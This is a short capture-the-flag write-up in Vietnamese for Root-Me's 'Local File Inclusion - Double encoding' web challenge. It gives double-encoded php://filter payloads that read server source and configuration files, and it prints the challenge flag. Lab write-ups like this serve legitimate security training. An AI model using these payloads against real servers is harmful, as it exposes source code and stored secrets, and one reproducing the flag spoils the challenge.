# [Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)

## Solutions

Sử dụng kĩ thuật double encode để bypass: [link](https://owasp.org/www-community/Double_Encoding)

- .: %252E
- /: %252F

Sử dụng filter để đọc nội dung các file:

- `php:%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource=index%252Ephp%00`: bị lỗi `include(): Failed opening`
- `php:%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource=cv%252Einc%252Ephp%00`: cũng bị lỗi `include(): Failed opening`
- Nếu không dùng null byte thì được, tuy nhiên chỉ đọc được những file có đuôi `.inc.php`, thử đọc file cv.inc.php `php:%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource=cv`, decode data nhận được:

```php
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - CV</title>
...
```

- Tương tự đọc file conf.inc.php:

```php
<?php
  $conf = [
    "flag"        => "Th1sIsTh3Fl4g!",
    "home"        => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
...
```

- Lấy được flag: `Th1sIsTh3Fl4g!`

## References

- <https://owasp.org/www-community/Double_Encoding>
